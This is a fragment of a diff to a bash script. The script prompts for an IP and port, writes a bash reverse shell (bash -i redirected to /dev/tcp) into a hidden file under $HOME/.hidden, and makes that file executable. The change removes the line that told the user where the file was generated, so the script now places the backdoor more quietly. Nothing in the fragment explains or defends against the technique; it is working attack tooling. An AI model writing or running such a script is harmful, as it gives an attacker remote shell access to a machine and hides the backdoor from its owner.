@@ -11,7 +11,6 @@ read -p "Enter port: " port
 echo "#!/bin/bash
 bash -i >& /dev/tcp/${ip}/${port} 0>&1 2>&1
 wait" >> $HOME/.hidden/connect.sh
-echo "Generated connect.sh in home/.hidden/connect.sh"
 
 #Give the script permission to execute
 chmod +x $HOME/.hidden/connect.sh
